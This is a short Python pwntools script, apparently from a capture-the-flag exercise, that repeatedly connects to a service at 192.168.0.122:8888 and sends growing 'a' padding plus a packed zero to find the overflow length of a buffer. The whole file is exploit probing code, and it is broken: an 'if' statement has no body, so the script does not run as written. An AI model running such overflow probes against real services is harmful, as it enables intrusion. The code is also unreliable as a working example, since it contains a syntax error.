from pwn import *

context.log_level = "debug"

for i in range(1,100):
	p = remote('192.168.0.122',8888)
	
	payload = 'a' * i + p64(0)
	p.recvuntil('How Long My Buffer?? (Give Me A Number!)')
	p.recvline()
	p.sendline(payload)

	p.recvline()
	p.recvline()
	if 'NO' not in p.recv():

p.interactive()
